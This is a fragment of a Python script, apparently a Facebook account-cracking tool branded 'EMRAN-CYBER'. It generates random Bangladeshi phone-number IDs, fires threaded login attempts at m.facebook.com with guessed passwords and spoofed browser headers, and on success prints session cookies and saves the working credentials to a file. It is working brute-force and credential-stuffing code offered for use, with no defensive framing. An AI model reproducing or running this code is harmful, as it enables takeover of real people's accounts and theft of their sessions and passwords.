        elif uid[:6] in ['100001']          :shanto = '√ 2010/2011'
        elif uid[:6] in ['100002','100003'] :shanto = '√ 2011/2012'
        elif uid[:6] in ['100004']          :shanto = '√ 2012/2013'
        elif uid[:6] in ['100005','100006'] :shanto = '√ 2013/2014'
        elif uid[:6] in ['100007','100008'] :shanto = '√ 2014/2015'
        elif uid[:6] in ['100009']          :shanto = '√ 2015'
        elif uid[:5] in ['10001']           :shanto = '√ 2015/2016'
        elif uid[:5] in ['10002']           :shanto = '√ 2016/2017'
        elif uid[:5] in ['10003']           :shanto = '√ 2018/2019'
        elif uid[:5] in ['10004']           :shanto = '√ 2019/2020'
        elif uid[:5] in ['10005']           :shanto = '√ 2020'
        elif uid[:5] in ['10006','10007','']:shanto = '√ 2021'
        elif uid[:5] in ['10008']           :shanto = '√ 2022'
        elif uid[:5] in ['10009']           :shanto = '√ 2023'
        else:shanto=''
    elif len(uid) in [9,10]:
        shanto = ' √ 2008/2009'
    elif len(uid)==8:
        shanto = '√ 2007/2008'
    elif len(uid)==7:
        shanto = '√ 2006/2007'
    else:shanto=''
    return shanto
    
#'Somrat_Ar_Real_Pappa'
#'Somrat_Akta_Bukachoda'   
    
# APK CHECK
def xxr():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(f' \033[0;31m[\033[1;97m🔵\033[1;91m]\033[38;5;46m 𝗘𝗫𝗔𝗠𝗣𝗟𝗘 : {xr}019,017,018,92302,92301,91778{x}')
    print(" \033[38;5;46m❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥")
    rk1 = '0171'
    rk2 = '0172'
    rk3 = '0175'
    code = random.choice([rk1,rk2,rk3])                      
    pww = input(f' \033[1;91m[\033[1;97m🔵\033[1;91m]\033[38;5;46m 𝗖𝗛𝗢𝗢𝗦𝗘 : ')
    os.system('clear')
    print(logo)
    limit = int(input(f' \033[1;91m[\033[1;91m🔵\033[1;91m]\033[1;91m EXAMPLE : 2000, 3000, 5000 \n \033[38;5;46m❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥\n \033[1;91m[\033[1;97m🔵\033[1;91m]\033[38;5;46m PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    passx = 0
    HamiiID = []
    print("")
    for bilal in range(passx):
        pww = input(f"\033[1;91m[\033[1;97m🔵\033[1;91m]\033[1;92m Enter Password {bilal+1} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=70) as manshera:
        clear()
        tl = str(len(user))
        print(f' \033[1;91m[\033[1;97m🔵\033[1;91m]\033[38;5;46m TOTAL IDS:\033[38;5;46m {xr}'+tl)
        print(f" \033[38;5;46m❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥")
        print("\033[38;5;46m┌━━━━━━━━━━━━━━━┐        \033[38;5;46m┌━━━━━━━━━━━━━━━━┐")
        print(f'\033[38;5;46m│ \033[38;5;46m𝙔𝙊𝙐𝙍 𝘾𝙃𝙊𝙄𝘾𝙀   \033[38;5;46m│       \033[38;5;46m │    \033[38;5;46m𝙀𝙈𝙇/𝘾𝙇𝙊𝙉𝙀 \033[38;5;46m \033[38;5;46m │ ')
        print(f"\033[38;5;46m│ \033[38;5;46m𝘾𝙍𝘼𝘾𝙆 𝙎𝙏𝘼𝙍𝙏  \033[38;5;46m │     \033[38;5;46m   │   \033[38;5;46m𝙏𝙄𝙈𝙀/{dt_string}  \033[38;5;46m\033[38;5;46m │")
        print("\033[38;5;46m└━━━━━━━━━━━━━━━┘      \033[38;5;46m  └━━━━━━━━━━━━━━━━┘\n")
        print(f" \033[38;5;46m❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥")           
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n{x} \033[38;5;46m\033[38;5;46m❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥")
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'm.facebook.com',
            'method': 'GET',
            'path': '/login/device-based/login/async/',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en-IN;q=0.9,en-AI;q=0.8,en;q=0.7,hi-IN;q=0.6,hi;q=0.5',
            'dpr': '2',
            'referer': 'https://m.facebook.com/',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="116", "Google Chrome";v="116"',
            'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="116.0.5789.210", "Google Chrome";v="116.0.5789.210"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '"RMX3269"',
            'sec-ch-ua-platform': '"Linux"',
            'sec-ch-ua-platform-version': '""',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/116.0.5789.210 Chrome/116.0.5789.210 Safari/537.36',
            'viewport-width': '980',
}
            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[38;5;46m [𝗘𝗠𝗥𝗔𝗡-𝗖𝗬𝗕𝗘𝗥-??𝟰𝟵𝟵-OK💙] ' +uid+ ' | ' +ps+    '  \n \033[1;33m[√]\033[1;32mCookie = \033[38;5;46m'+coki+  '  ''  \033[1;34m')
                import os
                cek_apk(session,coki)
                import os
                open('/sdcard/𝗘𝗠𝗥𝗔𝗡-𝗖𝗬𝗕𝗘𝗥-𝟬𝟰𝟵𝟵-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            #elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]                
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        brand=random.choice(['EMRAN CYBER','EMRAN-CYBER ','EMRAN CRACK '])
        colr=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        colo=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        emoji=random.choice(['😆','🐸','🙃','😈','🖕','🦅','🦉','🍎','🐝','🦟','🧐','😐','🙂','🤐','♥️','😘','😻','😍','😹','🤣','😂','😭','😁','😜','🤫','😶','🥱','😤','🥵','😇','💋','🙈','🙀','💚','💛','🖤','🤎','💙','💜','🦶','??','🌺','🌸','🏵️','🍁','🌼','??','🐍','🦡','✈️','🦛','🦐','🐇','🐮','🐰','🦃','🕸️','🦋','🍒','🍓','🍑','🍊','🥭','🍍','🍌','🌶️','🥥','🐛','🥕','🍗','🍆','🥐','🧀','🍤','🇧🇩','☠️'])
        colorful=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        sys.stdout.write(f"\r \33[1;90m[{colr}🦋⃟ᎶꫝᴍᴇᏒ✮⃝ᎬᴍRꫝɴ𝄟⃝\33[1;90m]{colo}✘\33[1;90m[{colorful}{loop}\33[1;90m/\33[1;92m{tl}\33[1;90m]-[OK:{len(oks)}\33[1;90m]-\33[1;90m[{emoji}]  "),
        sys.stdout.flush()
        sys.stdout.write(f'\r\r%s {x}[{xr}\033[38;5;46m𝗘𝗠𝗥𝗔𝗡-𝗖𝗬𝗕𝗘𝗥💥{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
xxr()
